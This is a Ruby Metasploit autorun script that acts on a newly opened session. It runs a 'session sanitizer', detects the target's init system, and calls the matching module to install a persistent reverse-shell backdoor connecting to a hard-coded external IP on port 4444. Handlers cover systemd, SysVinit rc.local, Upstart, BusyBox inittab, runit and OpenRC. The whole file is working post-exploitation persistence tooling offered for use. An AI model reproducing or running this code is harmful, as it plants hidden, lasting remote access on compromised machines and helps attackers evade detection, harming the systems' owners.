require '/home/msf/msf-autorunscripts/init_detector'
require '/home/msf/msf-autorunscripts/busyboxx_backdoor_inittab'
require '/home/msf/msf-autorunscripts/openrc_backdoor_initd'
require '/home/msf/msf-autorunscripts/systemd_backdoor_systemctl'
require '/home/msf/msf-autorunscripts/sysvinit_backdoor_rc_local'
require '/home/msf/msf-autorunscripts/upstart_backdoor_conf'
require '/home/msf/msf-autorunscripts/runit_backdoor_sv'
require '/home/msf/msf-autorunscripts/session_sanitizer'

fm        = client.framework
target_ip = client.session_host
sid       = client.sid

print("\n")
SessionSanitizer.run(fm, target_ip, sid)
print("\n")

init_type = InitDetector.detect(session)

lhost = "190.102.43.107"
lport = "4444"

init_handlers = {
  sysvinit: -> { RcLocalReverseShell.run(fm, sid, client, lhost, lport) },
  systemd:  -> { SystemdReverseShell.run(fm, sid, client, lhost, lport) },
  upstart:  -> { UpstartReverseShell.run(fm, sid, client, lhost, lport) },
  busybox:  -> { BusyboxInittabReverseShell.run(fm, sid, client, lhost, lport) },
  runit:    -> { RunitReverseShell.run(fm, sid, client, lhost, lport) },
  openrc:   -> { OpenrcReverseShell.run(fm, sid, client, lhost, lport) }
}

if handler = init_handlers[init_type]
  type_name = init_type.to_s.capitalize.gsub('sysvinit', 'SysVinit').gsub('busybox', 'Busybox')
  print_status("#{type_name} was detected")
  handler.call
else
  print_error("Unsupported or unknown init system: #{init_type}")
end
